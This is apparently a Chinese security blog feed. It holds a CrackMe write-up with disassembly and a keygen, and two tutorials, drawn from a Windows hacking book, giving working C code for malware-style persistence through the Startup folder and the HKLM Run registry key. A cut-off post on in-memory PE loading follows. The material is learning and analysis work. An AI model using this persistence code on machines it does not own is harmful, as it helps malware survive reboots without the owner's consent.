    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序，看到提示输入name和serial，输入后，提示错误。</p><p><img src="/2021/07/20/160CrackMe-002/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查壳，看到程序没有加壳，是用VB语言写的。</p><p><img src="/2021/07/20/160CrackMe-002/2.png"></p><p>使用OD进行分析，搜索错误提示的字符串，可以直接定位到关键的跳转</p><p><img src="/2021/07/20/160CrackMe-002/3.png"></p><p>开始分析生成serial的过程，首先是获取了name的长度然后将其乘以17CFB再加上name的第一个ASCII码，最后转为十进制字符串。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00402412 </span>  .  <span class="hljs-number">50</span>            push eax                                   ; /String = <span class="hljs-number">0000000</span>A ???<br><span class="hljs-symbol">00402413 </span>  .  <span class="hljs-number">8</span>B1A          mov ebx,dword ptr ds:[edx]                 ; |<br><span class="hljs-symbol">00402415 </span>  .  FF15 E4404000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;; \__vbaLenBstr<br><span class="hljs-number">0040241</span>B   .  <span class="hljs-number">8</span>BF8          mov edi,eax                                ;  获取输入的<span class="hljs-keyword">name</span>长度传入edi以便运算<br><span class="hljs-number">0040241</span>D   .  <span class="hljs-number">8</span>B4D E8       mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x18]<br><span class="hljs-symbol">00402420 </span>  .  <span class="hljs-number">69</span>FF FB7C0100 imul edi,edi,<span class="hljs-number">0</span>x17CFB                       ;  长度乘<span class="hljs-number">0</span>x17CFB<br><span class="hljs-symbol">00402426 </span>  .  <span class="hljs-number">51</span>            push ecx                                   ; /String = <span class="hljs-number">80020004</span> ???<br><span class="hljs-symbol">00402427 </span>  .  <span class="hljs-number">0</span>F80 <span class="hljs-number">91020000</span> jo Afkayas_.<span class="hljs-number">004026</span>BE                       ; |<br><span class="hljs-number">0040242</span>D   .  FF15 F8404000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.#<span class="hljs-number">516</span>&gt;]       ; \rtcAnsiValueBstr<br><span class="hljs-symbol">00402433 </span>  .  <span class="hljs-number">0</span>FBFD0        movsx edx,ax                               ;  获取输入的第一个ascii传给edx<br><span class="hljs-symbol">00402436 </span>  .  <span class="hljs-number">03</span>FA          add edi,edx                                ;  乘法后的结果加上第一个ascii<br><span class="hljs-symbol">00402438 </span>  .  <span class="hljs-number">0</span>F80 <span class="hljs-number">80020000</span> jo Afkayas_.<span class="hljs-number">004026</span>BE<br><span class="hljs-number">0040243</span>E   .  <span class="hljs-number">57</span>            push edi                                   ;  MSVBVM50.__vbaStrCat<br><span class="hljs-number">0040243</span>F   .  FF15 E0404000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;] ;  计算结果转为字符串（十进制）<br><span class="hljs-symbol">00402445 </span>  .  <span class="hljs-number">8</span>BD0          mov edx,eax<br><span class="hljs-symbol">00402447 </span>  .  <span class="hljs-number">8D4</span>D E0       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x20]<br></code></pre></div></td></tr></table></figure><p>然后将计算出的结果与“AKA-”进行拼接，再获取serial进行比较。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00402510 </span>  &gt; \<span class="hljs-number">8</span>B45 E8       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x18]            ;  输入的Serial<br><span class="hljs-symbol">00402513 </span>  .  <span class="hljs-number">8</span>B4D E4       mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x1C]            ;  计算后的结果<br><span class="hljs-symbol">00402516 </span>  .  <span class="hljs-number">8</span>B3D <span class="hljs-number">00414000</span> mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrC&gt;;  MSVBVM50.__vbaStrCat<br><span class="hljs-number">0040251</span>C   .  <span class="hljs-number">50</span>            push eax<br><span class="hljs-number">0040251</span>D   .  <span class="hljs-number">68</span> <span class="hljs-number">701</span>B4000   push Afkayas_.<span class="hljs-number">00401</span>B70                     ;  AKA-<br><span class="hljs-symbol">00402522 </span>  .  <span class="hljs-number">51</span>            push ecx                                   ; /String = <span class="hljs-number">80020004</span> ???<br><span class="hljs-symbol">00402523 </span>  .  FFD7          <span class="hljs-keyword">call</span> edi                                   ; \将AKA- 与计算后的数值拼接起来<br><span class="hljs-symbol">00402525 </span>  .  <span class="hljs-number">8</span>B1D <span class="hljs-number">70414000</span> mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrM&gt;;  MSVBVM50.__vbaStrMove<br><span class="hljs-number">0040252</span>B   .  <span class="hljs-number">8</span>BD0          mov edx,eax<br><span class="hljs-number">0040252</span>D   .  <span class="hljs-number">8D4</span>D E0       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x20]<br><span class="hljs-symbol">00402530 </span>  .  FFD3          <span class="hljs-keyword">call</span> ebx                                   ;  MSVBVM50.__vbaStrMove; &lt;&amp;MSVBVM50.__vbaStrMove&gt;<br><span class="hljs-symbol">00402532 </span>  .  <span class="hljs-number">50</span>            push eax<br><span class="hljs-symbol">00402533 </span>  .  FF15 <span class="hljs-number">28414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;&gt;;  比较<br></code></pre></div></td></tr></table></figure><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><p>根据分析的结果进行注册机编写</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入name\n&quot;</span>);<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>gets_s(name, <span class="hljs-number">20</span>);<br><span class="hljs-keyword">int</span> length = <span class="hljs-built_in">strlen</span>(name);<br><span class="hljs-keyword">int</span> num = length * <span class="hljs-number">0x17CFB</span>;<br>num += name[<span class="hljs-number">0</span>];<br><span class="hljs-keyword">char</span>* s1 = <span class="hljs-string">&quot;AKA-&quot;</span>;<br><span class="hljs-keyword">char</span>* serial = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br><span class="hljs-built_in">sprintf</span>(serial, <span class="hljs-string">&quot;%s%d&quot;</span>,s1,num);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;用户名是%s\n注册码是%s\n&quot;</span>,name, serial);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行输入name:b1ackie，输出serial:AKA-682815。</p><p><img src="/2021/07/20/160CrackMe-002/4.png"></p><p>输入正确的name和serial后，弹出正确提示</p><p><img src="/2021/07/20/160CrackMe-002/5.png"></p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自启动技术-快速启动目录</title>
    <link href="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/"/>
    <url>/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h4 id="快速启动目录"><a href="#快速启动目录" class="headerlink" title="快速启动目录"></a>快速启动目录</h4><p>Windows带有快速启动目录，将需要自启的程序放入其中，就可以实现开机自启。</p><h4 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h4><h5 id="SHGetSpecialFolderPath"><a href="#SHGetSpecialFolderPath" class="headerlink" title="SHGetSpecialFolderPath"></a>SHGetSpecialFolderPath</h5><p>获取指定的系统路径</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">BOOL </span><span class="hljs-keyword">SHGetSpecialFolderPath(</span><br><span class="hljs-keyword"></span>  HWND  hwndOwner,<br>  LPSTR lpszPath,<br>  int   nFolder,<br>  <span class="hljs-keyword">BOOL </span> fCreate<br>);<br></code></pre></div></td></tr></table></figure><p>hwndOwner：窗口所有者句柄</p><p>lpszPath：返回路径的缓冲区，该缓冲区带下至少为MAX_PATH</p><p>nFolder：系统路径的CSIDL标识。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>CSIDL_BITBUCKET</td><td>桌面\回收站</td></tr><tr><td>CSIDL_CONTROLS</td><td>我的电脑\控制面板</td></tr><tr><td>CSIDL_DESKTOP</td><td>桌面</td></tr><tr><td>CSIDL_DRIVES</td><td>我的电脑</td></tr><tr><td>CSIDL_STARTUP</td><td>开始菜单\程序\启动</td></tr><tr><td>CSIDL_SYSTEM</td><td>SYSTEM文件夹</td></tr><tr><td>CSIDL_WINDOWS</td><td>WINDOWS目录</td></tr></tbody></table><p>fCreate：指示文件夹不存在时是否要创建。为FALSE时则不创建，否则创建。</p><p>返回值：成功TRUE；失败FALSE。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>获取系统的快速启动目录，然后将需要自启的程序放入快速启动目录中。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;shlobj.h&gt;</span></span><br><span class="hljs-function">BOOL <span class="hljs-title">AutoRun</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszSrcFilePath, <span class="hljs-keyword">char</span>* lpszDestFileName)</span> </span>&#123;<br><span class="hljs-keyword">char</span> szStartUpPath[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">char</span> szDestFilePath[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-comment">//获取快速启动目录</span><br><span class="hljs-keyword">if</span> (SHGetSpecialFolderPathA(<span class="hljs-literal">NULL</span>, szStartUpPath, CSIDL_STARTUP, TRUE) == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取系统路径失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//将数据写入指定的缓冲区</span><br>wsprintfA(szDestFilePath, <span class="hljs-string">&quot;%s\\%s&quot;</span>, szStartUpPath, lpszDestFileName);<br><span class="hljs-comment">//将文件内容拷贝到缓冲区</span><br><span class="hljs-keyword">if</span> (CopyFileA(lpszSrcFilePath, szDestFilePath, FALSE) == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;向快速启动目录写入失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">if</span> (AutoRun(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>, <span class="hljs-string">&quot;TestApc.exe&quot;</span>) == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;失败\n&quot;</span>);<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;成功\n&quot;</span>);<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在物理机中运行一下此程序，火绒马上提醒</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/1.png"></p><p>在虚拟机中运行此程序，提示成功，然后到快速启动目录中查看，即可看到自启程序</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/2.png"></p><p>使用火绒剑进行查看，可以看到在windows的快速启动目录下，有TestApc.exe程序。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>自启动技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自启动技术-注册表</title>
    <link href="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/"/>
    <url>/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="注册表方式实现自启动"><a href="#注册表方式实现自启动" class="headerlink" title="注册表方式实现自启动"></a>注册表方式实现自启动</h4><p>实现开机自启动的方式有很多，其中修改注册表的方式是最为广泛的。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="RegOpenKeyEx"><a href="#RegOpenKeyEx" class="headerlink" title="RegOpenKeyEx"></a>RegOpenKeyEx</h5><p>打开一个指定的注册表键</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">LSTATUS <span class="hljs-title">RegOpenKeyExA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HKEY   hKey,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR lpSubKey,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD  ulOptions,</span></span><br><span class="hljs-params"><span class="hljs-function">  REGSAM samDesired,</span></span><br><span class="hljs-params"><span class="hljs-function">  PHKEY  phkResult</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>hKey：打开注册表项的句柄。该句柄由RegCreateKeyEx或RegOpenKeyEx函数返回，或者它可以是以下预定义键之一：</p><ul><li>HKEY_CLASSES_ROOT</li><li>HKEY_CURRENT_CONFIG </li><li>HKEY_CURRENT_USER</li><li>HKEY_LOCAL_MACHINE</li><li>HKEY_USERS</li></ul><p>lpSubKey：将打开的注册表子项的名称</p><p>ulOptions：保留，必须设置为0</p><p>samDesired：对指定键希望得到的访问权限进行的访问标记。这个参数可以是下列值得组合</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>KEY_CREATE_LINK</td><td>准许生成符号键</td></tr><tr><td>KET_CREATE_SUB_KEY</td><td>准许生成子键</td></tr><tr><td>KEY_ENUMERATE_SUB_KEYS</td><td>准许生成枚举子键</td></tr><tr><td>KEY_EXECUTE</td><td>准许进行读操作</td></tr><tr><td>KEY_NOTIFY</td><td>准许更换通告</td></tr><tr><td>KEY_QUERY_VALUE</td><td>准许查询子键</td></tr><tr><td>KEY_ALL_ACESS</td><td>提供完全访问，它是上面数值的组合</td></tr><tr><td>KEY_READ</td><td>是KEY_QUERY_VALUE,KEY_ENUMERATE_SUB_KEYS,KEY_NOTIFY的组合</td></tr><tr><td>KEY_SET_VALUE</td><td>准许设置子键的数值</td></tr><tr><td>KEY_WRITE</td><td>是KEY_SET_VALUE、KET_CREATE_SUB_KEY的组合</td></tr><tr><td>KEY_WOW64_32KEY</td><td>表示64位系统中的应用程序应该在32位注册表试图上运行。32位系统会忽略该标志。</td></tr><tr><td>KEY_WOW64_64KEY</td><td>表示64位系统的应用程序应该在64位注册表试图上运行。32位系统上忽略该标志。</td></tr></tbody></table><p>phkResult：指向一个变量的指针，该变量保存打开注册表键的句柄。如果不再使用返回的句柄，则调用RegClose来关闭它。</p><p>返回值：如果成功，返回0；失败返回一个非零的错误代码。</p><h5 id="RegSetValueEx函数"><a href="#RegSetValueEx函数" class="headerlink" title="RegSetValueEx函数"></a>RegSetValueEx函数</h5><p>在注册表项下设置指定值得数据和类型</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">LSTATUS RegSetValueExA(<br>  HKEY       hKey,<br>  LPCSTR     lpValueName,<br>  <span class="hljs-built_in">DWORD</span>      Reserved,<br>  <span class="hljs-built_in">DWORD</span>      dwType,<br>  const <span class="hljs-built_in">BYTE</span> *lpData,<br>  <span class="hljs-built_in">DWORD</span>      cbData<br>)<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>hKey：指定一个已打开项的句柄，或一个标准项名。</p><p>lpValueName：指向一个字符串的指针，该字符串包含了与设置值的名称。若拥有该名称的值并不存在于指定的注册表中，则此函数会将其加入到该项。如果此值是NULL或指向空字符串，则此函数将会设置该项的默认值或未命名值得类型和数据。</p><p>Reserved：保留值，必须为0；</p><p>dwType：指定将存储的数据类型，该参数可以为以下值之一。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>REG_BINARY</td><td>任何形式的二进制数据</td></tr><tr><td>REG_DWORD</td><td>一个32位的数字</td></tr><tr><td>REG_DWORD_LITTLE_ENDIAN</td><td>一个格式为“低字节在前”的32位数字</td></tr><tr><td>REG_DWORD_BIG_ENDIAN</td><td>一个格式为“高字节在前”的32位数字</td></tr><tr><td>REG_EXPAND_SZ</td><td>一个以0结尾的字符串，该字符串包含环境变量（如“%PATH”）</td></tr><tr><td>REG_LINK</td><td>一个Unicode格式的带符号链接</td></tr><tr><td>REG_MULTI_SZ</td><td>一个以0结尾的字符串数组，该数组以链接两个0作为终止符</td></tr><tr><td>REG_ONE</td><td>未定义值类型</td></tr><tr><td>REG_RESOURCE_LIST</td><td>一个设备驱动器资源列表</td></tr><tr><td>REG_SZ</td><td>一个以0结尾的字符串</td></tr></tbody></table><p>lpData：指向一个缓冲区，该缓冲区包含了为指定值名称存储的数据。</p><p>cbData：指定由lpData参数所指向的数据大小，单位是字节。</p><p>返回值：返回0表示陈成功；返回其他任何值都代表一个错误代码。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>对于Windows来说，提供了专门的开机自启动注册表，每次开机时，它都会在这个注册表键下遍历键值，以获取键值中的程序路径，并创建进程启动程序。所以要想实现注册表开机自启动，只需要在这个注册表键下添加想要设置自启动的程序路径就可以了。</p><p>这里用最常见的RUN键来进行设置，该键位置是[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]和[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</p><p>代码实现在HKEY_LOCAL_MACHINE下进行设置，这需要管理员运行权限。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function">BOOL <span class="hljs-title">Register</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszFileName, <span class="hljs-keyword">char</span>* lpszValueName)</span> </span>&#123;<br>    HKEY hKey;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, <span class="hljs-string">&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>, <span class="hljs-number">0</span>, KEY_WRITE, &amp;hKey) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开注册表失败\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">RegSetValueEx</span>(hKey, lpszValueName, <span class="hljs-number">0</span>, REG_SZ, (BYTE*)lpszFileName, (<span class="hljs-built_in">lstrlen</span>(lpszFileName) + <span class="hljs-number">1</span>)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;设置注册表值失败\n&quot;</span>);<br>        <span class="hljs-built_in">RegCloseKey</span>(hKey);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-built_in">RegCloseKey</span>(hKey);<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Register</span>(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\Register.exe&quot;</span>, <span class="hljs-string">&quot;b1ackie&quot;</span>) == FALSE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;自启动失败\n&quot;</span>);<br>        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;自启动成功\n&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>打开程序，提示自启动成功，说明注册表设置成功。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/1.png"></p><p>用regedit命令查看注册表相关信息，可以成功看到当前的注册表信息，注意图中路径的不同，这是因为重定位的原因。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/2.png"></p><p>也可以使用火绒剑，如图可以看到启动项的信息，现在重启计算机，就会自动启动了。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>自启动技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>启动技术-内存直接加载运行</title>
    <link href="/2021/07/15/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/"/>
    <url>/2021/07/15/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h4 id="内存直接加载运行"><a href="#内存直接加载运行" class="headerlink" title="内存直接加载运行"></a>内存直接加载运行</h4><p>内存直接加载运行就是，模拟PE加载器的功能，把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去运行，不需要通过loadlibrary等现成的API函数去操作。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>构造一个PE装载器，将PE文件加载到内存中。大致过程，首先要申请一块内存，然后将PE文件按照映像对齐大小映射到内存中；根据重定位表，重定位硬编码数据；获取导入表中的函数及其地址；如果是DLL，获取导出表的相关数据（EXE一般没有导出表）；获取入口点的地址，若为EXE，直接跳到入口点即可执行，DLL文件的话还需要构造一个DLLMAIN函数，实现DLL加载。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>打开文件并且获取大小</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">char</span>* FileName = <span class="hljs-string">&quot;自己的文件路径&quot;</span>;<br><span class="hljs-comment">//打开文件</span><br>HANDLE hFile = <span class="hljs-built_in">CreateFileA</span>(FileName, 